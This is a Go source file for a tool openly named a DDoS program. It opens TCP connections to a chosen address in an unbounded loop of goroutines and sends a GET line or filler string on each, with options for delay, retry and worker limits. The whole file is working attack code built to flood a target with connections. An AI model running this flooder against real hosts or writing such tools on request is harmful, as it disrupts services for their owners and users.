package main

import (
	"ddos/logger"
	"ddos/options"
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"
)

const (
	HttpMessage   = "GET / HTTP/1.1\n"
	SocketMessage = "abcdefghijklmnopqrstuvwxyz1234567890"
)

func ddos(opt options.Options) error {
	conn, err := net.Dial("tcp", opt.Address)
	if err != nil {
		return err
	}

	defer conn.Close()

	message := ""
	if opt.Message != "" {
		message = opt.Message
	} else {
		if opt.Http {
			message = HttpMessage
		} else {
			message = SocketMessage
		}
	}
	_, err = fmt.Fprintf(conn, "%v\n", message)
	if err != nil {
		return err
	}

	return nil
}

func main() {
	opt := options.Parse()
	log := logger.NewLogger(opt)
	currentRetryCount := 0
	currentWorkerCount := 0

	err := ddos(opt)
	if err != nil {
		log.Log("ERROR", fmt.Sprintf("Couldn't run test-connect, error: %v...", err))

		if !opt.IgnoreError {
			os.Exit(1)
		}
	}

	log.Log("INFO", "Starting DDOS...")

	if opt.Delay <= 0 {
		log.Log("WARN", "Undefined delay may cause system to lag...")
	}

	exitMessage := make(chan string)

	go func() {
		for {
			go func() {
				err := ddos(opt)
				if err != nil {
					log.Log("WARN", fmt.Sprintf("%v", err))

					if opt.MaxRetryCount <= 0 {
						return
					}

					if currentRetryCount += 1; currentRetryCount > opt.MaxRetryCount {
						exitMessage <- fmt.Sprintf("Reached max retry count (%v), exiting...", opt.MaxRetryCount)
					}
				} else {
					log.Log("INFO", fmt.Sprintf("Successfully send packet to %v...", opt.Address))
				}
			}()

			if opt.WorkerCount > 0 {
				currentWorkerCount++
				if currentWorkerCount >= opt.WorkerCount {
					exitMessage <- fmt.Sprintf("Worker count reached (%v), exiting...", opt.WorkerCount)
				}
			}

			time.Sleep(time.Millisecond * time.Duration(opt.Delay))
		}
	}()

	go func() {
		interruptSignal := make(chan os.Signal)
		signal.Notify(interruptSignal, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
		<-interruptSignal
		exitMessage <- "Interrupted by user, exiting..."
	}()

	log.Log("INFO", <-exitMessage)
}
